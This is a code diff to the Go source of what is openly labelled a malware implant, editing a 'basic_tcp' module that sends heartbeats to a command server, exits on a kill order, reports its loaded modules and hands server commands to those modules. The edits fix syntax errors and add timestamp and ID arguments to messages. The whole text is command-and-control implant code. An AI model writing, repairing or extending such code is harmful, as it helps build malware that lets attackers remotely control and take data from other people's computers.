@@ -8,7 +8,6 @@ import (
 	"malware/common/messages"
 	"malware/common/types"
 	"malware/implant/included_modules"
-	"math/rand"
 	"os"
 	"time"
 
@@ -35,7 +34,7 @@ func (settings settings) doConnection() {
 	defer cancel()
 
 	// Send a heartbeat message to ensure connection
-	reply, err := client.CheckCommandQueue(ctx, messages.Implant_heartbeat())
+	reply, err := client.CheckCommandQueue(ctx, messages.Implant_heartbeat(time.Now().Unix()))
 	if err != nil {
 		return
 	}
@@ -45,7 +44,7 @@ func (settings settings) doConnection() {
 		return
 	}
 
-	if reply.GetKill(() {
+	if reply.GetKill() {
 		os.Exit(0)
 	}
 
@@ -69,12 +68,9 @@ func (settings settings) doConnection() {
 		for _, module := range included_modules.Modules {
 			modules += module.ID() + " "
 		}
-		callback(messages.Implant_data("list", []byte(modules))
-		return 
+		callback(messages.Implant_data("list", []byte(modules)))
+		return
 	}
-
-
-
 
 	for _, module := range included_modules.Modules {
 		if module.HandleMessage(reply, callback) {
@@ -83,7 +79,7 @@ func (settings settings) doConnection() {
 	}
 
 	// Message was not handled, send error message
-	callback(messages.Implant_error(types.ERR_MODULE_NOT_IMPL))
+	callback(messages.Implant_error(settings.ID(), types.ERR_MODULE_NOT_IMPL))
 }
 
 func (settings settings) fixConnection() {
@@ -138,4 +134,3 @@ func (settings settings) Shutdown() {
 }
 
 func (settings) ID() string { return "basic_tcp" }
- 
